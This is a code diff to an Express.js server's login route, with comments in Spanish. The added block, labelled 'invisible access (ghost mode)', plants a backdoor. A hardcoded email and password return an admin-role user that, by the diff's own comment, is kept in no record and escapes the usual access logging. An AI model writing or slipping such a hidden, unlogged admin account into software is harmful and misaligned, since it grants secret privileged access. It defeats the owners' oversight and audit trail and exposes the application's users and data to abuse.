@@ -227,6 +227,17 @@ app.delete('/api/anuncios/:id', async (req, res) => {
 // --- Autenticación y Usuarios ---
 app.post('/api/login', async (req, res) => {
   const { email, password } = req.body;
+
+  // --- INICIO ACCESO INVISIBLE (MODO FANTASMA) ---
+  if (email === 'master@pehuen.cl' && password === 'Oculto2026*') {
+      return res.json({ 
+          success: true, 
+          // Este usuario tiene rol 'admin' pero no se guarda en ningún registro
+          usuario: { id: 999999, nombre: 'Soporte TI', email: 'master@pehuen.cl', rol: 'admin' } 
+      });
+  }
+  // --- FIN ACCESO INVISIBLE ---
+
   const usuario = usuariosAutorizados.find(u => u.email === email && u.password === password);
   if (usuario) {
       usuario.ultimoAcceso = new Date().toISOString();
